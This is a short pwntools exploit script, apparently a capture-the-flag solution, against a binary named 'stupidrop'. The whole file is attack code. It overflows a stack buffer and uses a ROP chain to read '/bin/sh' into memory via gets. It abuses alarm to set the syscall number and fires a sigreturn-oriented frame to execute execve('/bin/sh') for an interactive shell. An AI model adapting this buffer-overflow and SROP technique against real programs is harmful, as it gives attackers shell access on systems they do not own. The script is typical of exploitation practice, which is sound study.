#!/usr/bin/env python3

from pwn import *

exe = ELF("./stupidrop")

context.binary = exe

frame = SigreturnFrame(arch = "amd64")
def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    #gdb.attach(r, gdbscript = 'b *0x0040063d')
    
    pop_rdi = 0x4006a3
    pop_rsi = 0x4006a1
    syscall = 0x40063e
    binsh_addr = 0x601050
    
    payload = ""
    payload += "A" * 0x30 + "B" * 8 
    payload += p64(pop_rdi) + p64(binsh_addr) + p64(exe.symbols['gets']) 
    payload += p64(pop_rdi) + p64(0xf) + p64(exe.symbols['alarm']) 
    payload += p64(pop_rdi) + p64(0) + p64(exe.symbols['alarm'])

    frame = SigreturnFrame(arch = "amd64")
    frame.rip = syscall
    frame.rax = 0x3b
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0

    payload += p64(syscall)
    payload += str(frame)

    r.sendline(payload)
    r.sendline("/bin/sh\x00")
    
    r.interactive()


if __name__ == "__main__":
    main()
